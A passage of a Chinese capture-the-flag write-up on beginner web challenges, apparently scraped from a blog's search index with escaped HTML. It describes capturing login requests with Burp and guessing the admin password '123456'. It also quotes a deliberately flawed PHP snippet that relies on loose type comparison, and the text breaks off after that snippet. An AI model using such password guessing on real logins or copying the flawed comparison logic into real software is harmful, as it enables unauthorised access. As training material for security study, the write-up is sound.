Des:小宁写了一个登陆验证页面，随手就设了一个密码。\n 查看源码。\n\u0026lt;from class=\u0026quot;form-inline\u0026quot; method=\u0026quot;post\u0026quot; action=\u0026quot;./check.php\u0026quot;\u0026gt;\n有一个验证页面，访问它。\n页面空白，查看源码，提示。\n\u0026lt;!--maybe you need a dictionary--\u0026gt;\n这道题或许不需要字典？\n尝试御剑扫描，无果。\n好的我错了，随机输入用户名和密码，使用burp抓包，response显示用户名必须为admin，初次爆破无果，手动尝试123456，正确\u0026hellip;.如果尝试继续用字典的话还是可以爆出来，只是比较费时间。\n获得flag。\nsimple_php  Des:小宁听说php是最好的语言,于是她简单学习之后写了几行php代码。\n \u0026lt;?php show_source(__FILE__); include(\u0026#34;config.php\u0026#34;); $a = @$_GET[\u0026#39;a\u0026#39;]; $b = @$_GET[\u0026#39;b\u0026#39;]; if ($a == 0 and $a) { echo $flag1; } if (is_numeric($b)) { exit(); } if ($b \u0026gt; 1234) { echo $flag2; } ?","title":"攻防世界"},{"content":"","permalink":"https://oopsdc.github.io/tags/","summary":"tags","title":"Tag"}]